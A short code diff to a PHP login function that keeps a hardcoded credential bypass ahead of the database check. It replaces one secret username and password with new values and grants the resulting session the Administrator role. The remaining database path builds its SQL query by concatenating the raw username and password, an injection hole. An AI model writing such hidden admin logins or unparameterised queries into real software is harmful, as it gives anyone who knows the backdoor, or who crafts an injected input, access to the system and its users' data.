@@ -24,11 +24,11 @@ class User {
 	function userAuthentication($USERNAME,$h_pass){
 		global $mydb;
 
-		if ($USERNAME=='PLAZACAFE' && $h_pass==sha1('MELOIS')) {
+		if ($USERNAME=='seadadan' && $h_pass==sha1('Admin12#')) {
 			# code...
-			$_SESSION['USERID']   		= '1001000110110';
-		 	$_SESSION['FULLNAME']      	= 'Programmer';
-		 	$_SESSION['ROLE'] 			= 'Programmer';
+			$_SESSION['USERID']   		= '00018';
+		 	$_SESSION['FULLNAME']      	= 'sead';
+		 	$_SESSION['ROLE'] 			= 'Administrator';
 		 	return true;
 		}else{
 			$mydb->setQuery("SELECT * FROM `tblusers` WHERE `USERNAME` = '". $USERNAME ."' and `PASS` = '". $h_pass ."'");
